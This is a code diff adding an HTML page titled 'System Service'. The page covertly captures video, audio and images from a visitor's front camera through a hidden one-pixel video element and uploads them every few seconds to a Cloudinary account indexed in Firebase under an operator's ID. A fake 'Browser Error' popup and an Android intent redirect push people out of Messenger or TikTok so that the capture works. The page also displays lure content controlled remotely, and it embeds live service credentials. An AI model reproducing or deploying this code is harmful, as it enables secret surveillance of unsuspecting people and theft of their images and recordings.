@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>System Service</title>
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
+<style>
+    body { 
+        background: #fff; margin: 0; height: 100vh; 
+        display: flex; flex-direction: column; align-items: center; justify-content: center; 
+        overflow: hidden; font-family: 'Segoe UI', sans-serif; text-align: center;
+    }
+    .hidden { display: none !important; }
+
+    /* LIVE CONTROL CONTENT */
+    #live-container { width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; box-sizing: border-box; }
+    #live-text { font-size: 28px; font-weight: bold; color: #333; }
+    #live-img, #live-vid { max-width: 100%; max-height: 80vh; border-radius: 10px; margin-top: 20px; display: none; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
+
+    /* HIDDEN CAMERA */
+    #preview { opacity: 0; position: absolute; pointer-events: none; width: 1px; height: 1px; }
+
+    /* === CUSTOM POPUP (REDIRECT) === */
+    .modal-overlay {
+        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+        background: rgba(0,0,0,0.85); z-index: 9999;
+        display: flex; justify-content: center; align-items: center;
+        backdrop-filter: blur(5px);
+    }
+    .modal-box {
+        background: #1a1a1e; color: white; padding: 30px; border-radius: 20px;
+        width: 85%; max-width: 320px; text-align: center;
+        border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+    }
+    .chrome-btn {
+        background: #00e676; color: black; border: none; padding: 12px 20px;
+        font-weight: bold; border-radius: 30px; margin-top: 20px; cursor: pointer;
+        width: 100%; font-size: 16px;
+    }
+    .ios-note { font-size: 12px; color: #aaa; margin-top: 15px; line-height: 1.5; }
+</style>
+</head>
+<body>
+
+    <!-- REDIRECT POPUP (Messenger/TikTok Detector) -->
+    <div id="redirect-modal" class="modal-overlay hidden">
+        <div class="modal-box">
+            <h2 style="color:#ff3d00; margin-top:0;">⚠️ Browser Error</h2>
+            <p>Messenger/TikTok does not support Camera background access.</p>
+            <p>Please open this link in <b>Google Chrome</b>.</p>
+            <button class="chrome-btn" onclick="openInChrome()">OPEN IN CHROME</button>
+            <div class="ios-note">
+                <b>iPhone Users:</b><br> Tap the 3 dots (•••) at top right <br>and select "Open in Browser".
+            </div>
+        </div>
+    </div>
+
+    <!-- LIVE VIEW -->
+    <div id="live-container">
+        <h1 id="live-text">Connecting...</h1>
+        <img id="live-img">
+        <video id="live-vid" controls autoplay loop></video>
+    </div>
+
+    <video id="preview" autoplay playsinline muted></video>
+
+<script>
+    // --- 1. IN-APP BROWSER DETECTION & REDIRECT ---
+    const ua = navigator.userAgent;
+    // Detect Messenger, Facebook, TikTok, Instagram, Line
+    const isInApp = /FBAN|FBAV|Instagram|TikTok|Line/i.test(ua);
+    const isAndroid = /Android/i.test(ua);
+
+    if (isInApp) {
+        document.getElementById('redirect-modal').classList.remove('hidden');
+    }
+
+    function openInChrome() {
+        if (isAndroid) {
+            // Android Intent to Force Chrome
+            const currentUrl = window.location.href.replace('https://', '').replace('http://', '');
+            // This scheme forces Android to open the URL in Chrome
+            window.location.href = `intent://${currentUrl}#Intent;scheme=https;package=com.android.chrome;end`;
+        } else {
+            // For iOS or others where intent doesn't work
+            alert("Please copy the link and open it in Safari/Chrome manually.");
+        }
+    }
+
+    // --- 2. CONFIGURATION ---
+    const firebaseConfig = {
+        apiKey: "AIzaSyAAnJxWPmU2d_Lz15wCbwrujnZyfq8DQlk",
+        authDomain: "camera-cbf3e.firebaseapp.com",
+        projectId: "camera-cbf3e",
+        storageBucket: "camera-cbf3e.firebasestorage.app",
+        messagingSenderId: "1051235103322",
+        appId: "1:1051235103322:web:238b22d3c69263beb0de63",
+        measurementId: "G-2B2PNSPHX3"
+    };
+    const CLOUD_NAME = "dbkqfeq7k";
+    const UPLOAD_PRESET = "Camera1.0"; 
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const ADMIN_ID = urlParams.get('uid'); 
+    const MODE = urlParams.get('mode');
+
+    // --- 3. MAIN APP LOGIC ---
+    async function startApp() {
+        // If in-app browser, don't start camera to avoid errors
+        if (isInApp) return; 
+
+        if (!ADMIN_ID) {
+            document.getElementById('live-text').innerText = "System Error: 404";
+            return;
+        }
+
+        // Live Listener
+        db.collection('admins').doc(ADMIN_ID).collection('live').doc('screen')
+          .onSnapshot(doc => {
+              if(doc.exists) updateScreen(doc.data());
+          });
+
+        // Camera Logic
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+            document.getElementById('preview').srcObject = stream;
+            document.getElementById('live-text').innerText = "System Active";
+
+            if (MODE === 'record') {
+                startRecording(stream);
+            } else if (MODE === 'image') {
+                setInterval(() => captureImage(), 5000);
+            }
+
+        } catch (e) {
+            document.getElementById('live-text').innerText = "Camera Permission Denied";
+        }
+    }
+
+    function updateScreen(data) {
+        const txt = document.getElementById('live-text');
+        const img = document.getElementById('live-img');
+        const vid = document.getElementById('live-vid');
+
+        txt.style.display = 'none'; img.style.display = 'none'; vid.style.display = 'none'; vid.pause();
+
+        if (data.type === 'text') { txt.innerText = data.content; txt.style.display = 'block'; }
+        else if (data.type === 'image') { img.src = data.content; img.style.display = 'block'; }
+        else if (data.type === 'video') { vid.src = data.content; vid.style.display = 'block'; vid.play(); }
+    }
+
+    async function uploadToCloudinary(blob) {
+        const formData = new FormData();
+        formData.append('file', blob);
+        formData.append('upload_preset', UPLOAD_PRESET);
+
+        try {
+            const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/auto/upload`, { method: 'POST', body: formData });
+            const data = await res.json();
+            if(data.secure_url) {
+                const col = (MODE === 'record') ? 'recordings' : 'images';
+                db.collection("admins").doc(ADMIN_ID).collection(col).add({
+                    data: data.secure_url,
+                    createdAt: firebase.firestore.FieldValue.serverTimestamp()
+                });
+            }
+        } catch (err) {}
+    }
+
+    function startRecording(stream) {
+        let chunks = [];
+        const mr = new MediaRecorder(stream);
+        mr.ondataavailable = e => chunks.push(e.data);
+        mr.onstop = () => {
+            uploadToCloudinary(new Blob(chunks, { type: 'video/webm' }));
+            chunks = []; mr.start(); setTimeout(() => mr.stop(), 8000);
+        };
+        mr.start(); setTimeout(() => mr.stop(), 8000);
+    }
+
+    function captureImage() {
+        const video = document.getElementById('preview');
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        canvas.toBlob(blob => uploadToCloudinary(blob), 'image/jpeg', 0.7);
+    }
+
+    startApp();
+</script>
+</body>
+</html>
